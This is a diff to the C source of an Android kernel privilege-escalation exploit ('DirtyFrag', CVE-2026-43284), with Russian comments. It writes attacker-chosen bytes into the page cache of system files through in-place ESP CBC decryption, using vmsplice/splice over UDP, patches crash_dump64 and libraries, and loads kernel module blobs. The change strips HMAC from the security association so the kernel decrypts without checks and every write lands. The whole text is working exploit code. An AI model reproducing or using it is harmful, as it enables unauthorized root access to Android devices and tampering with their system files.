@@ -1,9 +1,11 @@
 /* DirtyFrag (CVE-2026-43284) — свой порт механизма RootMyAndroid поверх
  * исходников DFRoot: ESP-запись в page cache через in-place CBC-расшифровку.
  *
- * Отличия от DFRoot master (наша сборка):
- *  - SA с HMAC-SHA256 (trunc 128) — как в RootMyAndroid: пакет 56 байт
- *    (SPI+Seq+IV+ciphertext+ICV), ICV считаем сами (hmac_sha256.h);
+ * Отличия от RootMyAndroid (форма DFRoot V3.0, модернизация):
+ *  - SA только CRYPT_AES_CBC (без HMAC): пакет 40 байт
+ *    (SPI+Seq+IV+ciphertext) без ICV — ядро проверяет ICV до расшифровки,
+ *    и любой промах по ICV дропает пакет (page cache не меняется); без
+ *    auth-проверки расшифровка идёт безусловно и попадает в page cache;
  *  - KMI без android14-6.1 (примитив там мёртв — accidental mitigation);
  *  - ko-блобы как экспортируемые символы dirtyfrag_ko_*_start/_end.
  */
@@ -25,7 +27,6 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "aes256.h"
-#include "hmac_sha256.h"
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
@@ -34,7 +35,6 @@ static int      g_encap_port;
 static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
-static uint8_t  g_hmac_key[32];
 static uint32_t g_seq = 1;
 struct PatchRestore {
     const char *lib;
@@ -120,26 +120,18 @@ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
 }
 
 /* Send one CBC write.
- * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) + ICV(16)
- *   = 56 bytes.
- * ICV = HMAC-SHA256(hmac_key, hdr||ciphertext), усечение до 16 (trunc 128) —
- *   ядро проверяет его до расшифровки, считаем по wire-байтам.
+ * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
+ * Без auth-проверки (encryption-only SA) — ядро расшифровывает безусловно.
  * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
  * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
  * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
  */
 static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, off_t offset,
-                            const uint8_t iv[16], const uint8_t ct[16], int use_helper) {
+                            const uint8_t iv[16], int use_helper) {
     uint8_t hdr[24];
     *(uint32_t *)(hdr + 0) = htonl(g_spi);
     *(uint32_t *)(hdr + 4) = htonl(g_seq++);
     memcpy(hdr + 8, iv, 16);
-
-    uint8_t icv[16];
-    uint8_t mac_msg[40];
-    memcpy(mac_msg, hdr, 24);
-    memcpy(mac_msg + 24, ct, 16);
-    hmac_sha256(g_hmac_key, 32, mac_msg, 40, icv, 16);
 
     struct iovec iov = {.iov_base = hdr, .iov_len = 24};
     if (vmsplice(pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
@@ -160,13 +152,8 @@ static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, 
         }
     }
 
-    struct iovec icv_iov = {.iov_base = icv, .iov_len = 16};
-    if (vmsplice(pipe_wr, &icv_iov, 1, SPLICE_F_GIFT) != 16) {
-        printf("vmsplice ICV failed: %s\n", strerror(errno)); return -1;
-    }
-
-    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 56, 0);
-    if (s != 56) { printf("splice pipe->udp: %zd expected 56\n", s); return -1; }
+    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 40, 0);
+    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); return -1; }
     return 0;
 }
 
@@ -243,8 +230,7 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         uint8_t iv[16];
         compute_iv(old_content, desired, iv);
 
-        if (do_one_write_cbc(pfd[0], pfd[1], sk_send, file_fd, off, iv,
-                             old_content, use_helper) < 0) {
+        if (do_one_write_cbc(pfd[0], pfd[1], sk_send, file_fd, off, iv, use_helper) < 0) {
             printf("write #%zu at 0x%lx failed\n", i, (long)off);
             rc = -1; break;
         }
@@ -500,15 +486,15 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
 
 static void usage(const char *argv0) {
     fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX --hmac-key HEX\n",
+            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n",
             argv0);
 }
 
 static int setup(int argc, char **argv) {
     int encap_port = 0, sender_port = 0;
     uint32_t spi = 0;
-    uint8_t aes_key[32], hmac_key[32];
-    int have_aes = 0, have_hmac = 0;
+    uint8_t aes_key[32];
+    int have_aes = 0;
 
     for (int i = 1; i < argc; i++) {
         const char *a = argv[i];
@@ -520,11 +506,9 @@ static int setup(int argc, char **argv) {
             spi = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (!strcmp(a, "--aes-key") && i + 1 < argc)
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
-        else if (!strcmp(a, "--hmac-key") && i + 1 < argc)
-            have_hmac = hex_to_bytes(argv[++i], hmac_key, sizeof(hmac_key)) == 0;
         else { usage(argv[0]); return 2; }
     }
-    if (!encap_port || !sender_port || !spi || !have_aes || !have_hmac) {
+    if (!encap_port || !sender_port || !spi || !have_aes) {
         usage(argv[0]); return 2;
     }
 
@@ -533,7 +517,6 @@ static int setup(int argc, char **argv) {
     g_spi         = spi;
     g_seq         = 1;
     memcpy(g_aes_key, aes_key, 32);
-    memcpy(g_hmac_key, hmac_key, 32);
 
     const char *ko_target = detect_ko_target();
     libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
